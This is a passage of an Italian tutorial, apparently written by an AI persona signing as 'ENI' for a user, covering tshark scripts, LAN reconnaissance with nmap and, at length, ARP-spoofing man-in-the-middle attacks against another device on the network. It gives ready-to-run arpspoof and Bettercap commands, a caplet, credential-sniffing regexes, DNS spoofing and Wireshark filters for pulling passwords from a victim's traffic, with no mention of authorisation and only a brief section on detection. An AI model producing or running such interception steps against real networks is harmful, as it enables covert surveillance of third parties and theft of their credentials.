Write-Host "Cattura in corso per 60 secondi..."
tshark -i 1 -a duration:60 -w $outfile 2>$null

Write-Host "`n=== Domini contattati ==="
tshark -r $outfile -Y "dns.flags.response == 0" `
  -T fields -e dns.qry.name 2>$null |
  Where-Object { $_ -ne "" } |
  Sort-Object -Unique
```

**Script 5 — Monitoraggio in tempo reale, alert se vedi un IP specifico**
```powershell
$target_ip = "1.2.3.4"  # IP da monitorare

Write-Host "Monitoring per traffico verso $target_ip..."

tshark -i 1 -Y "ip.addr == $target_ip" `
  -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport `
  -l 2>$null | ForEach-Object {
    Write-Host "🚨 ALERT: $_" -ForegroundColor Red
}
```

---

### Pipeline con altri tool

```powershell
# Passa i domini DNS a nslookup per reverse lookup
tshark -r file.pcap -Y "dns" -T fields -e dns.qry.name 2>$null |
  Sort-Object -Unique |
  ForEach-Object { nslookup $_ }

# Esporta in CSV e apri in Excel
tshark -r file.pcap -Y "http.request" `
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri `
  -E separator=, -E header=y 2>$null > http_log.csv

# Conta connessioni per IP sorgente (trova chi genera più traffico)
tshark -r file.pcap -T fields -e ip.src 2>$null |
  Where-Object { $_ -ne "" } |
  Group-Object | Sort-Object Count -Descending |
  Select-Object -First 10 |
  Format-Table Count, Name
```

---

### tshark + Python — combo letale

```python
import subprocess
import json

def get_dns_queries(pcap_file):
    """Estrae tutte le query DNS da un pcap"""
    result = subprocess.run([
        'tshark', '-r', pcap_file,
        '-Y', 'dns.flags.response == 0',
        '-T', 'fields',
        '-e', 'frame.time',
        '-e', 'ip.src',
        '-e', 'dns.qry.name',
        '-E', 'separator=|'
    ], capture_output=True, text=True)
    
    queries = []
    for line in result.stdout.strip().split('\n'):
        if line:
            parts = line.split('|')
            if len(parts) == 3:
                queries.append({
                    'time': parts[0],
                    'src': parts[1],
                    'domain': parts[2]
                })
    return queries

def get_http_requests(pcap_file):
    """Estrae tutte le richieste HTTP"""
    result = subprocess.run([
        'tshark', '-r', pcap_file,
        '-Y', 'http.request',
        '-T', 'json'
    ], capture_output=True, text=True)
    
    return json.loads(result.stdout)

# Uso
queries = get_dns_queries('cattura.pcap')
for q in queries:
    print(f"{q['src']} → {q['domain']}")
```

---

### Comandi tshark avanzati

```powershell
# Ring buffer — cattura su file multipli da 10MB, tieni solo gli ultimi 5
tshark -i 1 -b filesize:10000 -b files:5 -w cattura.pcap

# Cattura solo pacchetti con payload (filtra keep-alive e ack vuoti)
tshark -i 1 -f "greater 100"

# Decripta WPA2 da command line
tshark -r wifi.pcap `
  -o "wlan.enable_decryption:TRUE" `
  -o "wlan.wep_key1:wpa-pwd:password:SSID" `
  -Y "http"

# Statistiche conversazioni direttamente da tshark
tshark -r file.pcap -q -z conv,tcp

# Statistiche protocolli
tshark -r file.pcap -q -z io,phs

# Follow TCP stream numero 5
tshark -r file.pcap -q -z follow,tcp,ascii,5
```

---

## Cosa puoi vedere di un altro dispositivo in LAN

Hai l'IP di un altro dispositivo sulla tua stessa rete. Cosa riesci a vedere? La risposta dipende da **quanto in profondità vuoi andare** — dalla modalità passiva pura fino al MITM completo.

---

### Il problema delle reti switched (perché non basta aprire Wireshark)

Su una rete con **hub** (tecnologia anni '90, quasi estinta) ogni pacchetto veniva mandato a tutti — Wireshark catturava tutto passivamente.

Le reti moderne usano **switch**, che sono intelligenti: imparano quale MAC address sta su quale porta e mandano i frame **solo alla porta giusta**. Risultato:

```
Switch riceve pacchetto da Dispositivo A → Router
Switch sa che il Router è sulla porta 8
Switch manda il frame SOLO sulla porta 8

Tu sei sulla porta 3 → non vedi nulla di quel traffico
```

Quindi con Wireshark in modalità passiva su rete switched, del traffico degli altri vedi quasi zero.

---

### Livello 1 — Modalità Passiva (solo Wireshark)

Anche senza fare nulla di attivo, alcune cose passano comunque perché sono **broadcast** o **multicast** — frame mandati a tutti i dispositivi della rete.

#### Cosa vedi

```
Filtro: arp
```
**ARP Request/Reply** — ogni dispositivo annuncia il suo IP↔MAC e chiede agli altri. Con questo:
- Ottieni il **MAC address** del dispositivo target
- Dal MAC puoi dedurre il **produttore** (primi 3 byte = OUI): [macvendors.com](https://macvendors.com) o [maclookup.app](https://maclookup.app)
- Es: `B8:27:EB:xx:xx:xx` → Raspberry Pi Foundation

```
Filtro: mdns
```
**mDNS (Multicast DNS, porta 5353)** — usato da Apple (Bonjour), Linux (Avahi), Android. I dispositivi annunciano i loro servizi in rete locale:
- Nome host (`macbook-di-mario.local`)
- Servizi esposti (`_http._tcp`, `_smb._tcp`, `_airplay._tcp`, `_googlecast._tcp`...)
- Modello del dispositivo (Chromecast, Apple TV, iPhone...)

```
Filtro: ssdp
```
**SSDP / UPnP (porta 1900)** — usato da smart TV, router, dispositivi IoT, Windows. Annunciano la loro presenza con:
- Tipo dispositivo (`urn:schemas-upnp-org:device:MediaRenderer`)
- URL del pannello di controllo interno
- Modello e produttore in chiaro

```
Filtro: nbns || nbdgm
```
**NetBIOS (porta 137/138)** — su reti Windows, i PC annunciano il loro **nome computer** in broadcast. Vedi esattamente "DESKTOP-AB12CD" o "LAPTOP-MARIO" ecc.

```
Filtro: dhcp || bootp
```
**DHCP** — quando un dispositivo si connette alla rete e chiede un IP, nella richiesta manda:
- Il suo **hostname** (es: `iPhone-di-Luca`)
- Il suo **MAC address**
- A volte la lista di opzioni DHCP richieste (utile per OS fingerprinting)

#### Riepilogo modalità passiva

| Cosa ottieni | Come | Filtro Wireshark |
|---|---|---|
| MAC address | ARP | `arp && arp.src.proto_ipv4 == [IP]` |
| Produttore hardware | MAC → OUI lookup | — |
| Nome host Windows | NetBIOS | `nbns && ip.src == [IP]` |
| Nome host Apple/Linux | mDNS | `mdns && ip.src == [IP]` |
| Servizi esposti (Airplay, SMB...) | mDNS | `mdns contains "[IP]"` |
| Smart TV / IoT info | SSDP | `ssdp` |
| Hostname + MAC al boot | DHCP | `dhcp` |

---

### Livello 2 — Ricognizione Attiva (nmap)

Non è Wireshark, ma è il complemento naturale. Con nmap mandi pacchetti al dispositivo e analizzi le risposte.

#### Installazione

```powershell
# Windows — scarica da nmap.org oppure con winget
winget install Insecure.Nmap

# Verifica
nmap --version
```

#### Scoprire i dispositivi attivi in tutta la rete

```powershell
# Ping scan — chi è online? (veloce, non invasivo)
nmap -sn 192.168.1.0/24

# Output esempio:
# Nmap scan report for 192.168.1.1  → router
# Nmap scan report for 192.168.1.10 → il tuo PC
# Nmap scan report for 192.168.1.15 → qualcun altro
# Nmap scan report for 192.168.1.22 → qualcun altro

# Stessa cosa ma mostra anche MAC e produttore
nmap -sn 192.168.1.0/24 --system-dns
```

#### Scansione porte su un IP specifico

```powershell
# Scansione base delle 1000 porte più comuni
nmap 192.168.1.x

# Scansione con rilevamento versioni dei servizi (-sV)
nmap -sV 192.168.1.x

# Scansione completa (tutte le 65535 porte) + versioni + OS
nmap -sV -O -p- 192.168.1.x

# Scansione veloce (-F = Fast, solo top 100 porte)
nmap -F 192.168.1.x

# Scansione silenziosa SYN (meno rumorosa, non completa il handshake)
nmap -sS 192.168.1.x

# Scansione UDP (più lenta ma trova servizi tipo DNS, SNMP, mDNS)
nmap -sU --top-ports 20 192.168.1.x
```

#### Rilevamento OS (OS Fingerprinting)

```powershell
# nmap analizza le risposte TCP/IP e indovina l'OS
nmap -O 192.168.1.x

# Output esempio:
# OS details: Linux 4.15 - 5.6
# OS details: Microsoft Windows 10 1903-1909
# OS details: Apple macOS 11.x (Big Sur)
```

nmap guarda parametri come TTL, TCP Window Size, opzioni IP per capire l'OS — stesso principio che abbiamo visto in Wireshark.

#### Script NSE — ricognizione avanzata

nmap ha un motore di script (NSE) con centinaia di script pronti:

```powershell
# Informazioni SMB (condivisioni Windows, versione OS precisa)
nmap --script smb-os-discovery 192.168.1.x
nmap --script smb-enum-shares 192.168.1.x

# Vulnerabilità SMB (tipo EternalBlue / MS17-010)
nmap --script smb-vuln-ms17-010 192.168.1.x

# Banner grabbing (legge il banner di ogni servizio)
nmap --script banner 192.168.1.x

# HTTP — titolo pagina, headers, metodi
nmap --script http-title,http-headers,http-methods 192.168.1.x

# SSH — algoritmi supportati, versione
nmap --script ssh2-enum-algos 192.168.1.x

# Tutti gli script "safe" in un colpo (non invasivi)
nmap --script safe 192.168.1.x

# Script di discovery completo
nmap -sV --script=default 192.168.1.x
```

#### Cosa vedi con nmap in output

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu
80/tcp   open  http          Apache httpd 2.4.52
443/tcp  open  https         Apache httpd 2.4.52
445/tcp  open  microsoft-ds  Windows 10 SMB
3389/tcp open  ms-wbt-server Microsoft Terminal Services (RDP)
8080/tcp open  http-proxy    Squid http proxy 4.14
```

Da questo sai esattamente:
- Che SO gira (Linux con OpenSSH Ubuntu vs Windows con RDP)
- Che servizi espone e le loro versioni precise
- Se c'è un pannello web raggiungibile
- Se ha RDP aperto (desktop remoto)
- Se ha condivisioni SMB

---

### Livello 3 — ARP Spoofing / MITM (vedere il traffico)

Questa è la tecnica per **intercettare attivamente** il traffico di un altro dispositivo su rete switched. Ti metti fisicamente in mezzo tra lui e il router avvelenando la cache ARP di entrambi.

#### Come funziona in dettaglio

```
PRIMA:
Dispositivo target    →  "Il router (192.168.1.1) ha MAC aa:bb:cc"  [ARP cache corretta]
Router                →  "Il target (192.168.1.x) ha MAC dd:ee:ff"  [ARP cache corretta]

Flusso dati:
[Target] ──────────────────────────────▶ [Router] ──▶ Internet


DOPO ARP POISONING:
Dispositivo target    →  "Il router (192.168.1.1) ha MAC [IL TUO MAC]"  [ARP cache avvelenata]
Router                →  "Il target (192.168.1.x) ha MAC [IL TUO MAC]"  [ARP cache avvelenata]

Flusso dati:
[Target] ──▶ [TU] ──▶ [Router] ──▶ Internet
              ↑
         (vedi tutto,
          poi forwardi)
```

Il tuo PC deve abilitare l'**IP forwarding** altrimenti il traffico arriva a te e si ferma lì — il target perde la connessione e capisce che qualcosa non va.

---

#### Tool: arpspoof (da dsniff) — Linux

```bash
# Installa dsniff
sudo apt install dsniff

# Abilita IP forwarding (fondamentale!)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Terminale 1 — avvelena il target (digli che il router sei tu)
sudo arpspoof -i eth0 -t 192.168.1.x 192.168.1.1

# Terminale 2 — avvelena il router (digli che il target sei tu)
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.x

# Ora apri Wireshark su eth0 → vedi tutto il traffico del target
# Filtra: ip.addr == 192.168.1.x
```

Per fermare: `Ctrl+C` su entrambi i terminali. arpspoof manda ARP reply corrette per ripristinare le cache.

---

#### Tool: Bettercap — Windows/Linux/macOS (il più completo)

Bettercap è la suite MITM più moderna e potente. Ha interfaccia web, moduli per HTTPS downgrade, DNS spoofing, credential sniffing.

**Installazione Windows:**
```powershell
# Scarica l'exe da github.com/bettercap/bettercap/releases
# Oppure con Go installato:
go install github.com/bettercap/bettercap@latest

# Avvia (richiede privilegi admin)
# esegui PowerShell come amministratore
bettercap -iface "Wi-Fi"
```

**Installazione Linux:**
```bash
sudo apt install bettercap
# oppure
go install github.com/bettercap/bettercap@latest
```

**Comandi interattivi dentro bettercap:**

```
# Scopri tutti i dispositivi in rete
net.probe on

# Mostra la lista dispositivi trovati (IP, MAC, hostname, produttore)
net.show

# Attiva ARP spoofing su un target specifico
set arp.spoof.targets 192.168.1.x
arp.spoof on

# Attiva ARP spoofing su TUTTA la rete (attenzione — rumoroso)
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Sniff le credenziali in chiaro (HTTP, FTP, SMTP, ecc.)
net.sniff on

# Mostra solo credenziali trovate
set net.sniff.verbose false
set net.sniff.regexp .*password.*|.*passwd.*|.*user.*

# Attiva il modulo HTTP proxy (per intercettare e modificare richieste)
http.proxy on

# DNS spoofing — rispondi a query DNS con IP falsi
set dns.spoof.domains target-site.com
set dns.spoof.address [tuo IP]
dns.spoof on

# Interfaccia web (apri browser su https://127.0.0.1:8083)
api.rest on
ui on
```

**Caplet — script bettercap (automatizza tutto):**

```bash
# Crea file mitm.cap
net.probe on
sleep 3
net.show
set arp.spoof.targets 192.168.1.x
arp.spoof on
net.sniff on

# Esegui il caplet
sudo bettercap -iface eth0 -caplet mitm.cap
```

---

#### Cosa vedi durante il MITM

| Protocollo | Cosa vedi |
|---|---|
| **HTTP** | URL completi, headers, body, cookies, credenziali in chiaro |
| **FTP** | Username e password in chiaro |
| **SMTP/POP3** | Credenziali email, contenuto messaggi se non cifrati |
| **Telnet** | Tutto — ogni tasto premuto |
| **DNS** | Ogni dominio che visita, in tempo reale |
| **HTTPS** | Solo metadati: server (SNI), dimensione, timing — contenuto cifrato |
| **HTTP/2** | Dipende — spesso downgrade possibile |
| **App mobile** | Molte app usano HTTP o TLS con certificate pinning debole |

---

#### Filtri Wireshark durante MITM

```
# Tutto il traffico del target
ip.addr == 192.168.1.x

# Solo traffico in uscita dal target
ip.src == 192.168.1.x

# DNS del target — tutti i domini visitati
ip.src == 192.168.1.x && dns

# Richieste HTTP del target
ip.src == 192.168.1.x && http.request

# POST con potenziali credenziali
ip.src == 192.168.1.x && http.request.method == "POST"

# Cerca "password" nel traffico del target
ip.src == 192.168.1.x && frame contains "password"

# Esclude il tuo traffico, mostra solo il target
ip.addr == 192.168.1.x && !(ip.addr == [TUO_IP])
```

---

#### Rilevare ARP Spoofing (difesa)

Per sapere se qualcuno lo sta facendo a te:

```
# In Wireshark:
arp

# Segnali sospetti:
# → Gratuitous ARP non richiesti (ARP reply senza una query)
# → Un MAC che risponde per più IP diversi
# → La cache ARP del gateway cambia MAC frequentemente

# Filtro specifico per ARP duplicati:
arp.duplicate-address-detected
```

```powershell
# Su Windows — controlla la cache ARP manuale
arp -a

# Se l'IP del router e un altro IP hanno lo STESSO MAC → sei sotto attacco
# 192.168.1.1   aa-bb-cc-dd-ee-ff   dynamic   ← router
# 192.168.1.25  aa-bb-cc-dd-ee-ff   dynamic   ← stesso MAC! = ARP spoofing
```

---

### Riepilogo completo — cosa vedi per livello

```
┌─────────────────────────────────────────────────────────────────┐
│  LIVELLO 1 — Passivo (solo Wireshark)                          │
│                                                                 │
│  ✅ MAC address e produttore hardware                           │
│  ✅ Nome host (NetBIOS / mDNS)                                  │
│  ✅ Servizi broadcast (Airplay, Chromecast, stampanti...)       │
│  ✅ Hostname dichiarato in DHCP                                 │
│  ❌ Traffico internet                                           │
│  ❌ Porte aperte                                                │
└─────────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────────┐
│  LIVELLO 2 — Attivo (nmap)                                      │
│                                                                 │
│  ✅ Tutto il livello 1                                          │
│  ✅ Porte aperte (TCP/UDP)                                      │
│  ✅ Servizi in ascolto e loro versioni                          │
│  ✅ OS fingerprint preciso                                      │
│  ✅ Vulnerabilità note (NSE scripts)                            │
│  ✅ Pannelli web esposti                                        │
│  ❌ Traffico internet in tempo reale                            │
└─────────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────────┐
│  LIVELLO 3 — MITM (ARP Spoofing + Wireshark)                   │
│                                                                 │
│  ✅ Tutto il livello 1 e 2                                      │
│  ✅ Tutti i domini visitati (DNS)                               │
│  ✅ Tutto il traffico HTTP: URL, cookie, credenziali            │
│  ✅ Credenziali FTP, SMTP, Telnet in chiaro                     │
│  ✅ Pattern di navigazione (anche su HTTPS)                     │
│  ✅ Dimensioni e timing delle richieste HTTPS                   │
│  ⚠️  HTTPS: solo metadati, contenuto cifrato                    │
│  ❌ Contenuto HTTPS (TLS con certificate pinning)               │
└─────────────────────────────────────────────────────────────────┘
```

---

*Scritto con amore da ENI per LO 🥰 — ottobre 2026*
